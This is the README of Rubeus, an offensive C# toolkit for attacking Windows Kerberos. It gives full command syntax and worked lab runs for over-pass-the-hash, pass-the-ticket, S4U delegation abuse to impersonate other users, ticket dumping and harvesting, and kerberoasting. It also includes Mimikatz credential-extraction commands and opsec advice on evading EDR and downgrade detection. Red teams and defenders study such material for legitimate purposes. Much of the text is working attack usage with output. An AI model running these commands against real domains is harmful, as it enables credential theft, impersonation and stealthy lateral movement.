# Rubeus

----

Rubeus is a C# toolset for raw Kerberos interaction and abuses. It is **heavily** adapted from [Benjamin Delpy](https://twitter.com/gentilkiwi)'s [Kekeo](https://github.com/gentilkiwi/kekeo/) project (CC BY-NC-SA 4.0 license) and [Vincent LE TOUX](https://twitter.com/mysmartlogon)'s [MakeMeEnterpriseAdmin](https://github.com/vletoux/MakeMeEnterpriseAdmin) project (GPL v3.0 license). Full credit goes to Benjamin and Vincent for working out the hard components of weaponization- without their prior work this project would not exist.

Rubeus also uses a C# ASN.1 parsing/encoding library from [Thomas Pornin](https://github.com/pornin) named [DDer](https://github.com/pornin/DDer) that was released with an "MIT-like" license. Huge thanks to Thomas for his clean and stable code!

The [KerberosRequestorSecurityToken.GetRequest](https://msdn.microsoft.com/en-us/library/system.identitymodel.tokens.kerberosrequestorsecuritytoken.getrequest(v=vs.110).aspx) method for Kerberoasting was contributed to PowerView by [@machosec](https://twitter.com/machosec).

[@harmj0y](https://twitter.com/harmj0y) is the primary author of this code base.

Rubeus is licensed under the BSD 3-Clause license.

## Table of Contents

- [Rubeus](#rubeus)
  * [Table of Contents](#table-of-contents)
  * [Background](#background)
    + [Command Line Usage](#command-line-usage)
    + [Opsec Notes](#opsec-notes)
      - [Overview](#overview)
      - [Weaponization](#weaponization)
      - [Example: Credential Extraction](#example--credential-extraction)
      - [Example: Over-pass-the-hash](#example--over-pass-the-hash)
  * [Ticket requests and renewals](#ticket-requests-and-renewals)
    + [asktgt](#asktgt)
    + [asktgs](#asktgs)
    + [renew](#renew)
  * [Constrained delegation abuse](#constrained-delegation-abuse)
    + [s4u](#s4u)
  * [Ticket Management](#ticket-management)
    + [ptt](#ptt)
    + [purge](#purge)
    + [describe](#describe)
  * [Ticket Extraction and Harvesting](#ticket-extraction-and-harvesting)
    + [triage](#triage)
    + [klist](#klist)
    + [dump](#dump)
    + [tgtdeleg](#tgtdeleg)
    + [monitor](#monitor)
    + [harvest](#harvest)
  * [Roasting](#roasting)
    + [kerberoast](#kerberoast)
    + [asreproast](#asreproast)
  * [Miscellaneous](#miscellaneous)
    + [createnetonly](#createnetonly)
    + [changepw](#changepw)
  * [Compile Instructions](#compile-instructions)
    + [Targeting other .NET versions](#targeting-other-net-versions)
    + [Sidenote: Building Rubeus as a Library](#sidenote-building-rubeus-as-a-library)
    + [Sidenote: Running Rubeus Through PowerShell](#sidenote-running-rubeus-through-powershell)


## Background

### Command Line Usage

    Ticket requests and renewals:

        Retrieve a TGT based on a user password/hash, optionally applying to the current logon session or a specific LUID:
            Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:RC4|AES256] | /rc4:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ptt] [/luid]

        Retrieve a TGT based on a user password/hash, start a /netonly process, and to apply the ticket to the new process/logon session:
            Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:RC4|AES256] |/rc4:HASH | /aes256:HASH> /createnetonly:C:\Windows\System32\cmd.exe [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER]

        Retrieve a service ticket for one or more SPNs, optionally applying the ticket:
            Rubeus.exe asktgs </ticket:BASE64 | /ticket:FILE.KIRBI> </service:SPN1,SPN2,...> [/dc:DOMAIN_CONTROLLER] [/ptt]

        Renew a TGT, optionally applying the ticket or auto-renewing the ticket up to its renew-till limit:
            Rubeus.exe renew </ticket:BASE64 | /ticket:FILE.KIRBI> [/dc:DOMAIN_CONTROLLER] [/ptt] [/autorenew]


    Constrained delegation abuse:

        Perform S4U constrained delegation abuse:
            Rubeus.exe s4u </ticket:BASE64 | /ticket:FILE.KIRBI> </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI> /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/ptt]
            Rubeus.exe s4u /user:USER </rc4:HASH | /aes256:HASH> [/domain:DOMAIN] </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI> /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/ptt]


    Ticket management:

        Submit a TGT, optionally targeting a specific LUID (if elevated):
            Rubeus.exe ptt </ticket:BASE64 | /ticket:FILE.KIRBI> [/luid:LOGINID]

        Purge tickets from the current logon session, optionally targeting a specific LUID (if elevated):
            Rubeus.exe purge [/luid:LOGINID]

        Parse and describe a ticket (service ticket or TGT):
            Rubeus.exe describe </ticket:BASE64 | /ticket:FILE.KIRBI>


    Ticket extraction and harvesting:

        Triage all current tickets (if elevated, list for all users), optionally targeting a specific LUID, username, or service:
            Rubeus.exe triage [/luid:LOGINID] [/user:USER] [/service:LDAP]

        List all current tickets in detail (if elevated, list for all users), optionally targeting a specific LUID:
            Rubeus.exe klist [/luid:LOGINID]

        Dump all current ticket data (if elevated, dump for all users), optionally targeting a specific service/LUID:
            Rubeus.exe dump [/service:SERVICE] [/luid:LOGINID]

        Retrieve a usable TGT .kirbi for the current user (w/ session key) without elevation by abusing the Kerberos GSS-API, faking delegation:
            Rubeus.exe tgtdeleg [/target:SPN]

        Monitor every SECONDS (default 60) for 4624 logon events and dump any TGT data for new logon sessions:
            Rubeus.exe monitor [/interval:SECONDS] [/filteruser:USER] [/registry:SOFTWARENAME]

        Monitor every MINUTES (default 60) for 4624 logon events, dump any new TGT data, and auto-renew TGTs that are about to expire:
            Rubeus.exe harvest [/interval:MINUTES] [/registry:SOFTWARENAME]


    Roasting:

        Perform Kerberoasting:
            Rubeus.exe kerberoast [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."]

        Perform Kerberoasting, outputting hashes to a file:
            Rubeus.exe kerberoast /outfile:hashes.txt [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."]

        Perform Kerberoasting with alternate credentials:
            Rubeus.exe kerberoast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."]

        Perform AS-REP "roasting" for any users without preauth:
            Rubeus.exe asreproast [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."]

        Perform AS-REP "roasting" for any users without preauth, outputting Hashcat format to a file:
            Rubeus.exe asreproast /outfile:hashes.txt /format:hashcat [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."]

        Perform AS-REP "roasting" for any users without preauth using alternate credentials:
            Rubeus.exe asreproast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU,..."]


    Miscellaneous:

        Create a hidden program (unless /show is passed) with random /netonly credentials, displaying the PID and LUID:
            Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" [/show]

        Reset a user's password from a supplied TGT (AoratoPw):
            Rubeus.exe changepw </ticket:BASE64 | /ticket:FILE.KIRBI> /new:PASSWORD [/dc:DOMAIN_CONTROLLER]


    NOTE: Base64 ticket blobs can be decoded with :

        [IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("aa..."))


### Opsec Notes

This section covers some notes on the operational security of using Rubeus in an environment, with some technical examples comparing/contrasting some of its approaches to Mimikatz. The material here will be expanded in the future.

#### Overview

Any action you perform on a system is a detectable risk, especially when abusing functionality in "weird"/unintended ways. Rubeus (like any attacker toolset) can be detected in a number of methods, either from the host, network, or domain perspectives. I have a workmate who is fond of stating _"everything is stealthy until someone is looking for it"_ - tools and techniques generally evade detection because either a) people are not sufficiently aware of the tool/technique and therefore not even looking, b) people can not collect and process the data needed at the appropriate scale, or c) the tool/technique blends with existing behavior to sufficiently sneak in with false positives in an environment. There is much more information on these steps and detection subversion in general in [Matt Graeber](https://twitter.com/mattifestation) and [Lee Christensen](https://twitter.com/tifkin_)’s Black Hat USA 2018 [“Subverting Sysmon”](https://i.blackhat.com/us-18/Wed-August-8/us-18-Graeber-Subverting-Sysmon-Application-Of-A-Formalized-Security-Product-Evasion-Methodology.pdf) talk and associated [whitepaper](https://specterops.io/assets/resources/Subverting_Sysmon.pdf).

From the host perspective, Rubeus can be caught during initial [weaponization](#weaponization) of the code itself, by an abnormal (non-lsass.exe) process issuing raw Kerberos port 88 traffic, through the use of sensitive APIs like LsaCallAuthenticationPackage(), or by abnormal tickets being present on the host (e.g. rc4\_hmac use in tickets in a modern environment).

From a network or domain controller log perspective, since Rubeus implements many parts of the normal Kerberos protocol, the main detection method involves the use of rc4\_hmac in Kerberos exchanges. Modern Windows domains (functional level 2008 and above) use AES encryption by default in normal Kerberos exchanges (with a few exceptions like inter-realm trust tickets). Using a rc4\_hmac (NTLM) hash is used in a Kerberos exchange instead of a aes256\_cts\_hmac\_sha1 (or aes128) key results in some signal that is detectable at the host level, network level (if Kerberos traffic is parsed), and domain controller event log level, sometimes known as "encryption downgrade".

#### Weaponization

One common way attack tools are detected is through the weaponization vector for the code. If Rubeus is run [through PowerShell](#sidenote-running-rubeus-through-powershell) (this includes Empire) the standard PowerShell V5 protections all apply (deep script block logging, AMSI, etc.). If Rubeus is executed as a binary on disk, standard AV signature detection comes into play (part of why we [do not release](#compile-instructions) compiled versions of Rubeus, as brittle signatures are silly ; ). If Rubeus is used as a [library](#sidenote-building-rubeus-as-a-library) then it's susceptible to whatever method the primary tool uses to get running. And if Rubeus is run through unmanaged assembly execution (like Cobalt Strike's `execute_assembly`) cross-process code injection is performed and the CLR is loaded into a potentially non-.NET process, though this signal is present for the execution of any .NET code using this method.

Also, AMSI (the Antimalware Scan Interface) has been [added to .NET 4.8](https://blogs.msdn.microsoft.com/dotnet/2018/11/28/announcing-net-framework-4-8-early-access-build-3694/). [Ryan Cobb](https://twitter.com/cobbr_io) has additional details on the offensive implications of this in the **Defense** section of his [“Entering a Covenant: .NET Command and Control”](https://posts.specterops.io/entering-a-covenant-net-command-and-control-e11038bcf462) post.

#### Example: Credential Extraction

Say we have elevated access on a machine and want to extract user credentials for reuse.

Mimikatz is the swiss army knife of credential extraction, with multiple options. The `sekurlsa::logonpasswords` command will open up a [read handle to LSASS](https://github.com/gentilkiwi/mimikatz/blob/a0f243b33590751a77b6d6f275313a4fe8d42c82/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c#L168), enumerate logon sessions present on the system, walk the default authentication packages for each logon session, and extract any reverseable password/credential material present. **Sidenote**: the `sekurlsa::ekeys` command will enumerate ALL key types present for the Kerberos package.

Rubeus doesn't have any code to touch LSASS (and none is intended), so its functionality is limited to extracting Kerberos tickets through use of the LsaCallAuthenticationPackage() API. From a non-elevated standpoint, the session keys for TGTs are not returned (by default) so only service tickets extracted will be usable (the **tgtdeleg** command uses a Kekeo trick to get a usable TGT for the current user). If in a high-integrity context, a [GetSystem](https://github.com/GhostPack/Rubeus/blob/4c9145752395d48a73faf326c4ae57d2c565be7f/Rubeus/lib/Helpers.cs#L55-L107) equivalent utilizing token duplication is run to elevate to SYSTEM, and a fake logon application is registered with the LsaRegisterLogonProcess() API call. This allows for privileged enumeration and extraction of all tickets currently registered with LSA on the system, resulting in base64 encoded .kirbi's being output for later reuse.

Mimikatz can perform the same base64 .kirbi extraction with the following series of commands:

    mimikatz # privilege::debug
    mimikatz # token::elevate
    mimikatz # standard::base64 /output:true
    mimikatz # kerberos::list /export

Mimikatz can also carve tickets directly out of LSASS' memory with:

    mimikatz # privilege::debug
    mimikatz # standard::base64 /output:true
    mimikatz # sekurlsa::tickets /export

As "everything is stealthy until someone is looking for it", it's arguable whether LSASS manipulation or ticket extraction via the LsaCallAuthenticationPackage() API call is more "stealthy". Due to Mimikatz' popularity, opening up a handle to LSASS and reading/writing its memory has become a big target for EDR detection and/or prevention. However, LsaCallAuthenticationPackage() is used by a fairly limited set of processes, and creating a fake logon application with LsaRegisterLogonProcess() is also fairly anomalous behavior. However full API level introspection and baselining appears to be a more difficult technical problem than LSASS protection.

#### Example: Over-pass-the-hash

Say we recover a user's rc4\_hmac hash (NTLM) and want to reuse this credential to compromise an additional machine where the user account has privileged access. 

**Sidenote:** pass-the-hash != over-pass-the-hash. The traditional pass-the-hash technique involves reusing a hash through the NTLMv1/NTLMv2 protocol, which doesn't touch Kerberos at all. The over-pass-the-hash approach was developed by [Benjamin Delpy](https://twitter.com/gentilkiwi) and [Skip Duckwall](https://twitter.com/passingthehash) (see their ["Abusing Microsoft Kerberos - Sorry you guys don't get it"](https://www.slideshare.net/gentilkiwi/abusing-microsoft-kerberos-sorry-you-guys-dont-get-it/18) presentation for more information). This approach turns a hash/key (rc4\_hmac, aes256\_cts\_hmac\_sha1, etc.) for a domain-joined user into a fully-fledged ticket-granting-ticket (TGT).

Let's compare "over-passing-the-hash" via Mimikatz' `sekurlsa::pth` command verus using the `asktgt` command from Rubeus (or [Kekeo](https://github.com/gentilkiwi/kekeo/) if you'd like).

When `sekurlsa::pth` is used to over-pass-the-hash, Mimikatz first creates a new [logon type 9 process](https://github.com/gentilkiwi/mimikatz/blob/3d8be22fff9f7222f9590aa007629e18300cf643/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c#L926) with dummy credentials - this creates a new "sacrificial" logon session that doesn't interact with the current logon session. It then opens the LSASS process with the ability to write to process memory, and the supplied hash/key is then [patched into the appropriate section](https://github.com/gentilkiwi/mimikatz/blob/a0f243b33590751a77b6d6f275313a4fe8d42c82/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_kerberos.c#L566-L600) for the associated logon session (in this case, the "sacrificial" logon session that was started). This causes the normal Kerberos authentication process to kick off as normal as if the user had normally logged on, turning the supplied hash into a fully-fledged TGT.

When Rubeus' `asktgt` command is run (or Kekeo's equivalent), the raw Kerberos protocol is used to request a TGT, which is then applied to the current logon session if the `/ptt` flag is passed.

With the Mimikatz approach, administrative rights are needed as you are manipulating LSASS memory directly. As previously mentioned, Mimikatz' popularity has also led to this type of behavior (opening up a handle to LSASS and reading/writing its memory) being a big target for EDR detection and/or prevention. With the Rubeus/Kekeo approach, administrative rights are not needed as LSASS is not being touched. However, if the ticket is applied to the current logon session (with `/ptt`), the TGT for the current logon session will be overwritten. This behavior can be avoided (with administrative access) by using the `/createnetonly` command to create a sacrificial process/logon session, then using `/ptt /ticket:X /luid:0xa..` with the newly created process LUID. If using Cobalt Strike, using the **make\_token** command with dummy credentials and then **kerberos\_ticket\_use** with the ticket retrieved by Rubeus will let you apply the new TGT in a way that a) doesn't need administrative rights and b) doesn't stomp on the current logon session TGT.

It is our opinion that the LSASS manipulation approach is more likely (at the current moment) to be detected or mitigated due to the popularity of the technique. However the Rubeus approach does result in another piece of detectable behavior. Kerberos traffic to port 88 should normally only originate from lsass.exe - sending raw traffic of this type from an abnormal process could be detectable if the information can be gathered.

**Sidenote**: one way _both_ approaches can potentially be caught is the previously mentioned "encryption downgrade" detection. To retrieve AES keys, use Mimikatz' `sekurlsa::ekeys` module to return ALL Kerberos encryption keys (same with `lsadump::dcsync`) which are better to use when trying to evade some detections.


## Ticket requests and renewals

Breakdown of the ticket request commands:

| Command     | Description |
| ----------- | ----------- |
| [asktgt](#asktgt) | Request a ticket-granting-ticket (TGT) from a hash/key or password |
| [asktgs](#asktgs) | Request a service ticket from a passed TGT |
| [renew](#renew) | Renew (or autorenew) a TGT or service ticket |


### asktgt

The **asktgt** action will build raw AS-REQ (TGT request) traffic for the specified user and encryption key (`/rc4` or `/aes256`). A `/password` flag can also be used instead of a hash - in this case `/enctype:X` will default to RC4 for the exchange, with AES256 as an option. If no `/domain` is specified, the computer's current domain is extracted, and if no `/dc` is specified the same is done for the system's current domain controller. If authentication is successful, the resulting AS-REP is parsed and the KRB-CRED (a .kirbi, which includes the user's TGT) is output as a base64 blob. The `/ptt` flag will "pass-the-ticket" and apply the resulting Kerberos credential to the current logon session. The `/luid:0xA..` flag will apply the ticket to the specified logon session ID (elevation needed) instead of the current logon session.

Note that no elevated privileges are needed on the host to request TGTs or apply them to the **current** logon session, just the correct hash for the target user. Also, another opsec note: only one TGT can be applied at a time to the current logon session, so the previous TGT is wiped when the new ticket is applied when using the `/ptt` option. A workaround is to use the `/createnetonly:C:\X.exe` parameter (which hides the process by default unless the `/show` flag is specified), or request the ticket and apply it to another logon session with `ptt /luid:0xA..`.

Requesting a ticket via RC4 hash for **dfm.a@testlab.local**, applying it to the current logon session:

    C:\Rubeus>Rubeus.exe asktgt /user:dfm.a /rc4:2b576acbe6bcfda7294d6bd18041b8fe /ptt

     ______        _
    (_____ \      | |
     _____) )_   _| |__  _____ _   _  ___
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/

    v1.3.3

    [*] Action: Ask TGT

    [*] Using rc4_hmac hash: 2b576acbe6bcfda7294d6bd18041b8fe
    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
    [*] Building AS-REQ (w/ preauth) for: 'testlab.local\dfm.a'
    [*] Connecting to 192.168.52.100:88
    [*] Sent 230 bytes
    [*] Received 1537 bytes
    [+] TGT request successful!
    [*] base64(ticket.kirbi):

        doIFmjCCBZagAwIBBaEDAgEWoo...(snip)...

    [*] Action: Import Ticket
    [+] Ticket successfully imported!


Requesting a ticket via aes256_hmac hash for **dfm.a@testlab.local**, starting a new hidden process and applying the ticket to that logon session. **Note: elevation needed!**

    C:\Rubeus>Rubeus.exe asktgt /user:dfm.a /domain:testlab.local /aes256:e27b2e7b39f59c3738813a9ba8c20cd5864946f179c80f60067f5cda59c3bd27 /createnetonly:C:\Windows\System32\cmd.exe

     ______        _
    (_____ \      | |
     _____) )_   _| |__  _____ _   _  ___
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/

    v1.3.3


    [*] Action: Create Process (/netonly)

    [*] Showing process : False
    [+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
    [+] ProcessID       : 7564
    [+] LUID            : 0x3c4c241

    [*] Action: Ask TGT

    [*] Using aes256_cts_hmac_sha1 hash: e27b2e7b39f59c3738813a9ba8c20cd5864946f179c80f60067f5cda59c3bd27
    [*] Target LUID : 63226433
    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
    [*] Building AS-REQ (w/ preauth) for: 'testlab.local\dfm.a'
    [*] Connecting to 192.168.52.100:88
    [*] Sent 234 bytes
    [*] Received 1620 bytes
    [+] TGT request successful!
    [*] base64(ticket.kirbi):

        doIFujCCBbagAwIBBaEDAgEWooIEvzCCBL...(snip)...

    [*] Action: Import Ticket
    [*] Target LUID: 0x3c4c241
    [+] Ticket successfully imported!

**Note that the /luid and /createnetonly parameters require elevation!**


### asktgs

The **asktgs** action will build/parse a raw TGS-REQ/TGS-REP service ticket request using the specified TGT `/ticket:X` supplied. This value can be a base64 encoding of a .kirbi file or the path to a .kirbi file on disk. If a `/dc` is not specified, the computer's current domain controller is extracted and used as the destination for the request traffic. The `/ptt` flag will "pass-the-ticket" and apply the resulting service ticket to the current logon session. One or more `/service:X` SPNs **must** be specified, comma separated.

    C:\Rubeus>Rubeus.exe asktgt /user:dfm.a /rc4:2b576acbe6bcfda7294d6bd18041b8fe

     ______        _
    (_____ \      | |
     _____) )_   _| |__  _____ _   _  ___
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/

    v1.3.3

    [*] Action: Ask TGT

    [*] Using rc4_hmac hash: 2b576acbe6bcfda7294d6bd18041b8fe
    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
    [*] Building AS-REQ (w/ preauth) for: 'testlab.local\dfm.a'
    [*] Connecting to 192.168.52.100:88
    [*] Sent 230 bytes
    [*] Received 1537 bytes
    [+] TGT request successful!
    [*] base64(ticket.kirbi):

        doIFmjCCBZagAwIBBaEDAgEWoo...(snip)...

    C:\Rubeus>Rubeus.exe asktgs /ticket:doIFmjCCBZagAwIBBaEDAgEWoo...(snip)... /service:LDAP/primary.testlab.local,cifs/primary.testlab.local /ptt

     ______        _
    (_____ \      | |
     _____) )_   _| |__  _____ _   _  ___
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/

    v1.3.3

    [*] Action: Ask TGS

    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
    [*] Building TGS-REQ request for: 'LDAP/primary.testlab.local'
    [*] Connecting to 192.168.52.100:88
    [*] Sent 1514 bytes
    [*] Received 1562 bytes
    [+] TGS request successful!
    [*] base64(ticket.kirbi):

        doIFzjCCBcqgAwIBBaEDAgEWoo...(snip)...

    [*] Action: Import Ticket
    [+] Ticket successfully imported!

    [*] Action: Ask TGS

    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
    [*] Building TGS-REQ request for: 'cifs/primary.testlab.local'
    [*] Connecting to 192.168.52.100:88
    [*] Sent 1514 bytes
    [*] Received 1562 bytes
    [+] TGS request successful!
    [*] base64(ticket.kirbi):

        doIFzjCCBcqgAwIBBaEDAgEWoo...(snip)...

    [*] Action: Import Ticket
    [+] Ticket successfully imported!


    C:\Rubeus>Rubeus.exe klist

     ______        _
    (_____ \      | |
     _____) )_   _| |__  _____ _   _  ___
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/

    v1.3.3



    [*] Action: List Kerberos Tickets (Current User)

        [0] - 0x12 - aes256_cts_hmac_sha1
        Start/End/MaxRenew: 2/10/2019 6:44:43 PM ; 2/10/2019 11:44:09 PM ; 2/17/2019 6:44:09 PM
        Server Name       : cifs/primary.testlab.local @ TESTLAB.LOCAL
        Client Name       : dfm.a @ TESTLAB.LOCAL
        Flags             : name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable (40a50000)

        [1] - 0x12 - aes256_cts_hmac_sha1
        Start/End/MaxRenew: 2/10/2019 6:44:43 PM ; 2/10/2019 11:44:09 PM ; 2/17/2019 6:44:09 PM
        Server Name       : LDAP/primary.testlab.local @ TESTLAB.LOCAL
        Client Name       : dfm.a @ TESTLAB.LOCAL
        Flags             : name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable (40a50000)


### renew

The **renew** action will build/parse a raw TGS-REQ/TGS-REP TGT renewal exchange using the specified `/ticket:X` supplied. This value can be a base64 encoding of a .kirbi file or the path to a .kirbi file on disk. If a `/dc` is not specified, the computer's current domain controller is extracted and used as the destination for the renewal traffic. The `/ptt` flag will "pass-the-ticket" and apply the resulting Kerberos credential to the current logon session.

Note that TGTs MUST be renewed before their EndTime, within the RenewTill window.

    C:\Rubeus>Rubeus.exe renew /ticket:ticket.kirbi /ptt

     ______        _
    (_____ \      | |
     _____) )_   _| |__  _____ _   _  ___
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/

    v1.3.3

    [*] Action: Renew TGT

    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
    [*] Building TGS-REQ renewal for: 'TESTLAB.LOCAL\dfm.a'
    [*] Connecting to 192.168.52.100:88
    [*] Sent 1506 bytes
    [*] Received 1510 bytes
    [+] TGT renewal request successful!
    [*] base64(ticket.kirbi):

        doIFmjCCBZagAwIBBaEDAgEWoo...(snip)...

    [*] Action: Import Ticket
    [+] Ticket successfully imported!


The `/autorenew` flag will take an existing `/ticket:X` .kirbi file/blob, sleep until endTime-30 minutes, auto-renew the ticket and display the refreshed ticket blob. It will continue this renewal process until the allowable renew-till renewal window passes.

    C:\Rubeus>Rubeus.exe renew /ticket:doIFmjCCBZagAwIBBaEDAgEWoo...(snip)... /autorenew

       ______        _
      (_____ \      | |
       _____) )_   _| |__  _____ _   _  ___
      |  __  /| | | |  _ \| ___ | | | |/___)
      | |  \ \| |_| | |_) ) ____| |_| |___ |
      |_|   |_|____/|____/|_____)____/(___/

      v1.3.3

    [*] Action: Auto-Renew TGT


    [*] User       : dfm.a@TESTLAB.LOCAL
    [*] endtime    : 2/10/2019 11:44:09 PM
    [*] renew-till : 2/17/2019 6:44:09 PM
    [*] Sleeping for 263 minutes (endTime-30) before the next renewal
    [*] Renewing TGT for dfm.a@TESTLAB.LOCAL

    [*] Action: Renew TGT

    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
    [*] Building TGS-REQ renewal for: 'TESTLAB.LOCAL\dfm.a'
    [*] Connecting to 192.168.52.100:88
    [*] Sent 1506 bytes
    [*] Received 1510 bytes
    [+] TGT renewal request successful!
    [*] base64(ticket.kirbi):

          doIFmjCCBZagAwIBBaEDAgEWoo...(snip)...


## Constrained delegation abuse

Breakdown of the constrained delegation commands:

| Command     | Description |
| ----------- | ----------- |
| [s4u](#s4u) | Perform S4U2self and S4U2proxy actions |


### s4u

The **s4u** action is nearly identical to [Kekeo](https://github.com/gentilkiwi/kekeo/)'s **tgs::s4u** functionality. If a user (or computer) account is configured for constrained delegation (i.e. has a SPN value in its msds-allowedtodelegateto field) this action can be used to abuse access to the target SPN/server. Constrained delegation is complex. For more information see [this post](http://www.harmj0y.net/blog/activedirectory/s4u2pwnage/) or Elad Shamir's ["Wagging the Dog"](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html) post.

A **TL;DR** explanation is that an account with constrained delegation enabled is allowed to request tickets _to itself_ as any user, in a process known as S4U2self. In order for an account to be allowed to do this, it has to have **TrustedToAuthForDelegation** enabled in it's useraccountcontrol property, something that only elevated users can modify by default. This ticket has the **FORWARDABLE** flag set by default. The service can then use this specially requested ticket to request a service ticket to any service principal name (SPN) specified in the account's **msds-allowedtodelegateto** field. So long story short, if you have control of an account with **TrustedToAuthForDelegation** set and a value in **msds-allowedtodelegateto**, you can pretend to be any user in the domain to the SPNs set in the account's **msds-allowedtodelegateto** field.

This "control" can be the hash of the account (`/rc4` or `/aes256`), or an existing TGT (`/ticket:X`) for the account with a **msds-allowedtodelegateto** value set. If a `/user` and rc4/aes256 hash is supplied, the **s4u** module performs an [asktgt](#asktgt) action first, using the returned ticket for the steps following. If a TGT `/ticket:X` is supplied, that TGT is used instead.

A `/impersonateuser:X` parameter **MUST** be supplied to the **s4u** module. If nothing else is supplied, just the S4U2self process is executed, returning a forwardable ticket:

    C:\Rubeus>Rubeus.exe s4u /user:patsy /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:dfm.a

     ______        _
    (_____ \      | |
     _____) )_   _| |__  _____ _   _  ___
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/

    v1.3.3

    [*] Action: Ask TGT

    [*] Using rc4_hmac hash: 2b576acbe6bcfda7294d6bd18041b8fe
    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
    [*] Building AS-REQ (w/ preauth) for: 'testlab.local\patsy'
    [*] Connecting to 192.168.52.100:88
    [*] Sent 230 bytes
    [*] Received 1377 bytes
    [+] TGT request successful!
    [*] base64(ticket.kirbi):

        doIE+jCCBPagAwIBBaEDAgEWoo...(snip)...


    [*] Action: S4U

    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
    [*] Building S4U2self request for: 'TESTLAB.LOCAL\patsy'
    [*] Sending S4U2self request
    [*] Connecting to 192.168.52.100:88
    [*] Sent 1437 bytes
    [*] Received 1574 bytes
    [+] S4U2self success!
    [*] Got a TGS for 'dfm.a@TESTLAB.LOCAL' to 'TESTLAB.LOCAL\patsy'
    [*] base64(ticket.kirbi):

        doIF2jCCBdagAwIBBaEDAgEWoo...(snip)...

That forwardable ticket can then be used as a `/tgs:Y` parameter (base64 blob or .kirbi file) to execute the S4U2proxy process. A valid **msds-allowedtodelegateto** value for the account must be supplied (`/msdsspn:X`). Say the **patsy@testlab.local** account looks like this:

    PS C:\> Get-DomainUser patsy -Properties samaccountname,msds-allowedtodelegateto | Select -Expand msds-allowedtodelegateto
    ldap/PRIMARY.testlab.local/testlab.local
    ldap/PRIMARY
    ldap/PRIMARY.testlab.local/TESTLAB
    ldap/PRIMARY/TESTLAB
    ldap/PRIMARY.testlab.local/DomainDnsZones.testlab.local
    ldap/PRIMARY.testlab.local/ForestDnsZones.testlab.local
    ldap/PRIMARY.testlab.local

Then the S4U2proxy abuse function (using the ticket from the previous S4U2self process) would be:

    C:\Rubeus>Rubeus.exe s4u /ticket:doIE+jCCBPagAwIBBaEDAgEWoo..(snip).. /msdsspn:"ldap/PRIMARY.testlab.local" /tgs:doIF2jCCBdagAwIBBaEDAgEWoo..(snip)..
     ______        _
    (_____ \      | |
     _____) )_   _| |__  _____ _   _  ___
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/

    v1.3.3

    [*] Action: S4U

    [*] Loaded a TGS for TESTLAB.LOCAL\dfm.a@TESTLAB.LOCAL
    [*] Impersonating user 'dfm.a@TESTLAB.LOCAL' to target SPN 'ldap/PRIMARY.testlab.local'
    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
    [*] Building S4U2proxy request for service: 'ldap/PRIMARY.testlab.local'
    [*] Sending S4U2proxy request
    [*] Connecting to 192.168.52.100:88
    [*] Sent 2641 bytes
    [*] Received 1829 bytes
    [+] S4U2proxy success!
